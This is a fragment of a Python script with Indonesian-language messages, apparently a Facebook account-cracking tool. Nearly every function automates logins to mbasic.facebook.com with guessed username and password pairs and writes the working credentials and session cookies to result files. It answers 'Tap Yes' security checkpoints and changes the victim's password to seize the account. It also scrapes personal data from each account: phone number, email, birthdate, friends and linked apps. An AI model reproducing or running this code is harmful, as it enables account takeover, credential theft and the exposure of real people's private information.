		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:
		print(war+"Skip Tap Yes")
def sttt(userr, pww, tta):
	global user,pw,ttl
	try:
		user = userr
		pw = pww
		ttl = tta
		cek_opsi_crack(user, pw, tll)
	except:pass

#########################
# Terima Kasih To Latip #          <<< KNTL
#########################
def cek_opsi(user, pw):
#	global aman,cp,salah
	global url,bz
	bz += 1
	url = "https://mbasic.facebook.com"
	session=req.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	soup=par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=par(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print(war+"Hidup Matikan Mode Pesawat, Selama 2 Detik !!")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {K}{user}|{pw}{Q}		\n",end="")
			print(f"\r{jarak}{war}Akun Ini Kenak Sesi New					\n\n",end="")
		else:
#			aman+=1
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}{Q}        \n",end="")
			print(f"\r{jarak}{Q}[{I}✓{Q}]{C} Cookie: {I}{coki}{Q}\n",end="")
			open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+pw+"|"+coki+"\n")
			get_infoo(session,coki)
			cek_apk(session,coki)
	elif "checkpoint" in session.cookies.get_dict():
#		cp+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=par(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {K} {user}|{pw}{Q}		\n",end="")
#		print(f"\r\33[1;33m[CP] {user} | {pw}								\33[37;1m\n",end="")
		print(f"\r{Q}[{M}!{Q}] Terdapat {K}{len(cek)}{Q} Opsi :	\n",end="")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(session,response,link2)
				else:
					print(f"\r{jarak}{Q}[{I}√{Q}]{I} Selamat Akun Ini Tap Yes {Q}\n{jarak}[{C}+{Q}]{Q} Cookie: {I}{coki}{Q}\n")
					cek_apk(session,coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print(f"\r{jarak}{Q}[{M}×{P}] {M}Akun A2F On            {Q}\n")
			else:
				print(f"\r{jarak}{war}{M}Terjadi Masalah Terhadap Akun{Q}     		\n")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print(f"\r{jarak}{Q}[{C}{number}{Q}] {K}{''.join(opsi)}			{Q}\n",end="")
			print("")
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print(f"\r{jarak}{Q}[{C}{number}{Q}] {K}{''.join(opsi)}			{Q}\n",end="")
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw}|{coki}{Q}        \n",end="")
				open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+pw+"|"+coki+"\n")
				get_infoo(session,coki)
				cek_apk(session,coki)
				
	else:
#		salah+=1
		print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {M}{user}|{pw}{Q}")
		print(f"\r{jarak}{war}{M}Kata Sandi Salah !          {P}\n")
def ubah_pw(session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=par(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwBaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print(f"\r{jarak}{jarak}{Q}[{I}✓{Q}]{I} AKUN INI TAP YES{Q}\n{jarak}{jarak}{Q}[{I}✓{Q}]{I} {user}|{''.join(pwBaru)}|{coki}{Q}\n",end="")
		bokep_japan_yang_terbaru("TAP", user, "".join(pwBaru), "")
		open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+"".join(pwBaru)+"|"+coki+"\n")
		if "checkpoint" not in coki:
			get_infoo(session,coki)
			cek_apk(session,coki)
		else:
			print("")

def get_infoo(session,coki):
	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:
		nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:
		nomer = ""
	try:
		email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:
		email=""
	try:
		ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:
		ttl=""
	try:
		teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

	except:
		teman = ""
	try:
		pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:
		pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	print(f"{jarak}╭──[{I}✓{P}] Name Account       : {K}{nama}{P}\n{jarak}├──[{I}✓{P}] Number of Friends    : {K}{teman}{P}\n{jarak}├──[{I}✓{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}├──[{I}✓{P}] Email Aktif     : {K}{email}{P}\n{jarak}├──[{I}✓{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}├──[{I}✓{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}╰──[{I}✓{P}] Tanggal Lahir   : {K}{ttl}{P}")
def ubah_username_to_id(user):
	try:
		if user == "me":
			memek = "me"
		else:
			payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
			if "facebook" in user:
				payload = {"fburl": user, "check": "Lookup"}
			mmk = requests.post("https://lookup-id.com/", data=payload).content
			xxx = par(mmk, "html.parser")
			idt = xxx.find("span", id="code")
			asw = idt.text
			memek = asw
		return memek
	except:
		return user
def text_random():
	contol = uuid.uuid4().hex[:10].upper()
	return contol

def cek_apk(session,coki):
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki,"user-agent":"Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print(f"{jarak}{war}Aplikasi Yang Terkait*")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print(f"{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *")
		else:
			print(f"{jarak}{jarak}{war}Aplikasi Aktif*")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print(f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			print(f"{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *")
		else:
			hit1,hit2=0,0
			print(f"{jarak}{jarak}{war}Aplikasi Kedaluwarsa*")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print(f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}")
				hit2+=1
	else:
		print(f"{jarak}{war}{M}Cookies Error !")
	print("")

def cek_cookies_by_risky(userr, cokii, memek_mamak_yayan):
	kntl_yayan = ""
	user = userr
	coki = kukis_v1(cokii)
	akun_nn = memek_mamak_yayan
	session = req.Session()


	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:nomer = ""
	try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:email=""
	try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:ttl=""
	try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
	except:teman = ""
	try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	kntl_yayan += (f"{jarak}╭──[{I}✓{P}] Nama Akun       : {K}{nama}{P}\n{jarak}├──[{I}✓{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}├──[{I}✓{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}├──[{I}✓{P}] Email Aktif     : {K}{email}{P}\n{jarak}├──[{I}✓{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}├──[{I}✓{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}╰──[{I}✓{P}] Tanggal Lahir   : {K}{ttl}{P}\n")

	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		kntl_yayan += (f"{jarak}{war}Aplikasi Yang Terkait*\n")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			kntl_yayan += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *\n")
		else:
			kntl_yayan += (f"{jarak}{jarak}{war}Aplikasi Aktif*\n")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				kntl_yayan += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			kntl_yayan += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *\n")
		else:
			hit1,hit2=0,0
			kntl_yayan += (f"{jarak}{jarak}{war}Aplikasi Kedaluwarsa*\n")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				kntl_yayan += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
				hit2+=1
	else:
		kntl_yayan += (f"\r{jarak}{jarak}{war}{M}Cookies Error !\n")
	print(akun_nn+"\n"+kntl_yayan)



def cek_apk_fast(session,coki):
	global mem
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		mem += (f"{jarak}{war}Aplikasi Yang Terkait*\n")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			mem += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *\n")
		else:
			mem += (f"{jarak}{jarak}{war}Aplikasi Aktif*\n")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				mem += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			mem += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *\n")
		else:
			hit1,hit2=0,0
			mem += (f"{jarak}{jarak}{war}Aplikasi Kedaluwarsa*\n")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				mem += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
				hit2+=1
	else:
		mem += (f"{jarak}{war}{M}Cookies Error !\n")
	mem += ("\n")

def get_infoo_fast(session,coki):
	global mem
	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:
		nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:
		nomer = ""
	try:
		email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:
		email=""
	try:
		ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:
		ttl=""
	try:
		teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

	except:
		teman = ""
	try:
		pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:
		pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	mem += (f"{jarak}╭──[{I}✓{P}] Nama Akun       : {K}{nama}{P}\n{jarak}├──[{I}✓{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}├──[{I}✓{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}├──[{I}✓{P}] Email Aktif     : {K}{email}{P}\n{jarak}├──[{I}✓{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}├──[{I}✓{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}╰──[{I}✓{P}] Tanggal Lahir   : {K}{ttl}{P}")
def log_hasil(user, pasw):
    global mem
    mem = ""
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(Q,M,Q)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            mem += (f"\r{Q}[{M}!{Q}]{M}Akun Ini Kenak Sesi New\n")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('Hasil/OK-'+durasi+'.txt', 'a').write(f"{user}|{pasw}|{coki}\n")
            mem += (f"\r{Q}[{I}✓{Q}]{I} Selamat Akun Ini Tidak Check Point\n");mem +=(f"\r{war}{I}Sedang Check Aplikasi !!{Q}\n");time.sleep(0.03)
            cek_apk_fast(session,coki)
            get_infoo_fast(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    mem += (f"\r{Q}[{I}✓{Q}]{I} Selamat Akun Ini Tap Yes\n");mem += (f"\r{war}Mohon Tunggu Sebentar, Sedang Ubah Kata Sandi, Dan Check Aplikasi\n");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "DUMAI-991"
                    mem += (f"\r{Q}[{I}✓{Q}]{I} Selamat Akun Ini Tap Yes");mem += (f"\r{war}Mohon Tunggu Sebentar, Sedang Ubah Kata Sandi, Dan Check Aplikasi\n");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                mem += (f"{war}Maaf Akun Ini A2F On")
            else:
                open('Hasil/Error.txt', 'a').write(f"{user}|{pasw}\n")
                mem +=(f"{war}Terjadi Masalah Terhadap Akun")
        else:
            open(f'Hasil/CP-'+durasi+'.txt', 'a').write(f"{user}|{pasw}\n")
            mem += ("%s[%s!%s] Terdapat %s Opsi \n"%(N,K,N,len(cek)))
        for opt in range(len(cek)):
            mem += (f"{jarak}{Q}[{C}{str(opt+1)}{Q}] "+cek[opt]+"\n")
    else:
        mem +=(f"{war}{M}Kata Sandi Telah DiUbah, Atau Salah Kata Sandi{Q}\n")
        open('Hasil/Gagal-Login.txt', 'a').write(f"{user}|{pasw}\n")
    print("\n"+war+user+"|"+pasw+"\n"+mem)
def ubah_pw_fast(session,response,link2,user,mmk):
    global mem
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        mem +=(f"\r{jarak}{N}[{I}✓{N}] Berhasil Mengubah Kata Sandi Menjadi :\n{jarak}{N}[{I}✓{N}]{I} {user}|{''.join(mmk)}|{coki}{N}")
        open('Hasil/Akun-Tap-Yes.txt', 'a').write(f"{user}|{''.join(mmk)}|{coki}\n")
        cek_apk_fast(session,coki)
        get_infoo_fast(session,coki)

def log_hasill(user, pasw, ttll):
    global ua
    lp = ""
#    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    host = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        lp += (M+"Akun Ini KeSpam !!"+Q+"\n")
    if "c_user" in ses.cookies:
        lp += (I+"Akun Ini Tidak Check Poits\n")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            lp += (I+"Akun Ini Hooo Yess (Tap Yes)"+Q+"\n")
            open("Hasil/Akun_Tap_Yes.txt","a+").write("{}|{}\n".format(user,pasw))
            bokep_japan_yang_terbaru("TAP", user, pasw, "-")
        else:
            lp += ("Tersedia %s Opsi \n"%(str(len(ngew))))
        for opt in range(len(ngew)):
            lp += ("      "+str(opt+1)+". "+ngew[opt]+"\n")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        lp += ("%s%s%s\n"%(U,oh,Q))
    else:
        lp += (M+"Kata Sandi Sudah DiUbah !"+Q+"\n")
    print("\r"+war+K+user+"|"+pasw+" | "+ttll+Q+"\n"+war+lp+"            ",end=" >>KIKY")

def koki_apk(kukis_mama):
#	kiko = []
	try:
		kikis = kukis_mama.split(";")
		c_user = kikis[0]
		all_kus = kukis_mama.split(c_user+";")[1]
		coki_coki = (all_kus+";"+c_user)
		kiko = (coki_coki)
		return kiko
	except:
		return kukis_mama
#	print(kiko)

def dump_name(kukis):
	ses_ = requests.Session()
	url = "https://mbasic.facebook.com/search/people/?q=Risky"
	dat_game = ses_.get(url,cookies={'cookie':kukis})
	datagame = par(dat_game.content,'html.parser')
	form_    = datagame.find('form',method='post')
	data_tex = datagame.text
	print(data_tex)
	open("tes.py","w").write(data_tex)

def cek_apk_v1(kukis):
    apk = []
    ak = 0
    ek = 0
    ses_ = requests.Session()
#    print(kukis)
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':kukis})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    data_tex = datagame.text
#    print(data_tex)
    if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau" in data_tex:
        apk.append(f"\n{jarak}{war}{M}Tidak Ada Aplikasi Yang Terkait {Q}({U}APK AKTIF{Q}){Q}")
    else:
        apk.append(f"\n{jarak}{war}{I}Aplikasi Yang Terkait {Q}({U}APK AKTIF{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
